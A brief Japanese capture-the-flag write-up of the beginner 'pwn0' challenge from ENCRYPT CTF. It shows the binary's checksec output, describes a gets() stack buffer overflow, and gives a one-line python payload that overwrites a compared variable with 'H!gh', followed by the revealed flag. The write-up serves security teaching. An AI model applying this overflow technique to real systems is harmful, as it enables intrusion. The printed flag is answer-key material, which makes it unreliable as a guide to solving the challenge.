# [pwn 25pts] pwn0 - ENCRYPT CTF
32bitバイナリでセキュリティ機構は基本的に無効のようです。
```
$ checksec pwn0
[*] 'pwn0'
    Arch:	32 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	No RELRO
    PIE:	PIE disabled
```
IDAで解析しましょう。
getsによるスタックオーバーフローがあります。
`esp-0x1C`がバッファなのですが、`esp-0x5C`にある変数と"H!gh"という文字を比較しています。
したがって、0x40バイト適当な文字を入れた後に"H!gh"を入れれば良さそうです。

```
$ python -c 'print("A" * 0x40 + "H!gh")' | ./pwn0 
How's the josh?
Good! here's the flag
encryptCTF{L3t5_R4!53_7h3_J05H}
```

# 感想
pwn始めたばっかりの人向け問題ですね。